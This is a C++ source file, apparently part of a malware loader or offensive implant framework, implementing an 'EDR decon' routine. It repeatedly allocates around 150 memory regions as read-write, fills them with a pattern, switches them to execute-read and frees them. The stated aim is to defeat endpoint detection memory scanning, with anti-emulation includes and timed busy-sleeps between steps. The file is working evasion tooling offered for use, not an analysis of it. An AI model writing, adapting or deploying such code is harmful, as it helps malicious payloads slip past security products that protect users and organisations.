#include "edr_decon.h"
#include "../utils/logging.h"
#include "../modules/anti_emulation.h"
#include "../config.h"
#include <windows.h>
#include <vector>

// Defaults if not provided by config.h
#ifndef NUMBER_OF_ALLOCS
#define NUMBER_OF_ALLOCS 150
#endif

#ifndef NUMBER_OF_ITERATIONS
#define NUMBER_OF_ITERATIONS 5
#endif

/*
RW-RX Loop to defeat EDR memory scanning:
1. Allocate multiple memory regions as RW
2. Fill with data
3. Change protections to RX
4. Free the regions
*/

/*============================[Resolve APIs]=====================================================================================================*/


namespace EDRDecon {

    void DoFakeOverwrites(SIZE_T deconbytes)
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        size_t pageSize = si.dwPageSize;

        // Cap each allocation to 1 MB max
        size_t effectiveLen = (deconbytes > 1024 * 1024) ? 1024 * 1024 : deconbytes;
        size_t allocSize = ((effectiveLen + pageSize - 1) / pageSize) * pageSize;

        Log::Write(Log::LogLevel::Msg,
            "DECONBYTES=" + std::to_string(deconbytes) +
            " -> EffectiveLen=" + std::to_string(effectiveLen) +
            ", AllocSize=" + std::to_string(allocSize));

		std::vector<PVOID> allocatedAddrs(NUMBER_OF_ALLOCS, nullptr);

        BusySleepMs(2000);

        for (int iter = 0; iter < NUMBER_OF_ITERATIONS; iter++) {
            Log::Write(Log::LogLevel::Msg, "EDR Decon Iteration " + std::to_string(iter + 1) + "/" + std::to_string(NUMBER_OF_ITERATIONS));
            // Step 1: Allocate multiple RW regions
            for (int i = 0; i < NUMBER_OF_ALLOCS; i++) {
                allocatedAddrs[i] = VirtualAlloc(
                    nullptr,
                    allocSize,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE
                );
                if (!allocatedAddrs[i]) {
                    Log::Write(Log::LogLevel::Warn, "failed on virtualalloc " + std::to_string(i));
                    continue;
                }
                // Fill with fake data
                auto* ptr = static_cast<char*>(allocatedAddrs[i]);
                for (size_t i = 0; i < effectiveLen; ++i) {
                    ptr[i] = 0x41 + (i % 26); // Fill with A-Z pattern
                }
            }

            BusySleepMs(3000);

            // Step 2: Change protections to RX
            for (int i = 0; i < NUMBER_OF_ALLOCS; i++) {
                DWORD oldProtect = 0;
                if (allocatedAddrs[i] && !VirtualProtect(allocatedAddrs[i], allocSize, PAGE_EXECUTE_READ, &oldProtect)) {
                    Log::Write(Log::LogLevel::Warn, "VirtualProtect failed on alloc " + std::to_string(i));
                }
            }

            BusySleepMs(3000);

            // Step 3: Free the regions
            for (int i = 0; i < NUMBER_OF_ALLOCS; i++) {
                if (allocatedAddrs[i]) {
                    if (!VirtualFree(allocatedAddrs[i], 0, MEM_RELEASE)) {
                        Log::Write(Log::LogLevel::Warn, "VirtualFree failed on alloc " + std::to_string(i));
					}
                }
            }
        }

    }
}

